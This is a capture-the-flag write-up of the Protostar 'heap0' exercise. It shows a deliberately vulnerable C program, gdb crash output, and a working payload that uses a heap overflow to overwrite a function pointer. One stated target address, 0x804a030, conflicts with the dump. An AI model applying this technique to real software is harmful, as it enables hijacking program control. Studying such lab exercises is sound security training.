## HEAP 0 ##
This level introduces heap overflows and how they can influence code flow.

This level is at /opt/protostar/bin/heap0

### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);

  f->fp();

}
```
In order to pass this level, we need to overflow the heap in order to overwrite
the address of the function *nowinner* with *winner* address.

Therefore, we need to find the address of *winner()* first
```
p winner
$1 = {void (void)} 0x8048464 <winner>
```

Now if you probe with a long input
```
/opt/protostar/bin/heap0 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS

Program received signal SIGSEGV, Segmentation fault.
eax            0x53535353       1397969747
ecx            0x0      0
edx            0x4d     77
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff74c       0xbffff74c
ebp            0xbffff778       0xbffff778
esi            0x0      0
edi            0x0      0
eip            0x53535353       0x53535353
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0x804a000:      0x00000000      0x00000049      0x41414141      0x42424242
0x804a010:      0x43434343      0x44444444      0x45454545      0x46464646
0x804a020:      0x47474747      0x48484848      0x49494949      0x4a4a4a4a
0x804a030:      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d      0x4e4e4e4e
0x804a040:      0x4f4f4f4f      0x50505050      0x51515151      0x52525252
0x804a050:      0x53535353      0x00000000      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0xbffff74c:     0x080484ff      0x0804a008      0xbffff954      0x0804a050
0x53535353:     Error while running hook_stop:
Cannot access memory at address 0x53535353
0x53535353 in ?? ()

```
Therefore, we just need to overwrite 0x804a030 with the address if *winner*
function

```
/opt/protostar/bin/heap0 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR\x64\x84\x04\x08"`"
data is at 0x804a008, fp is at 0x804a050
level passed

```
